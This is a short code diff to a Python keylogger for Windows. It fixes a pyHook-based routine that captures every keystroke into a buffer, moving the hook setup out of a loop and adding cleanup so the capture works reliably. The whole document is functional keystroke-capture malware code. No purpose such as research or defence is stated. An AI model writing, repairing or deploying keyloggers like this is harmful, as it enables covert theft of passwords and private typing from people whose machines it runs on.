@@ -9,12 +9,15 @@ def OnKeyboardEvent(event):
         keysPressed += chr(event.Ascii) 
     if event.Ascii == 13: 
         keysPressed += "/n"
+    return True
 
 def keylogger_win(size):       
-    global keysPressed    
+    global keysPressed   
+    hm = pyHook.HookManager()  
+    hm.KeyDown = OnKeyboardEvent 
+    hm.HookKeyboard() 
     while len(keysPressed) < size:
-        hm = pyHook.HookManager() 
-        hm.KeyDown = OnKeyboardEvent 
-        hm.HookKeyboard() 
-        pythoncom.PumpMessages()
-    return keysPressed
+        pythoncom.PumpWaitingMessages()
+    else:
+        hm.UnhookKeyboard()
+        return keysPressed
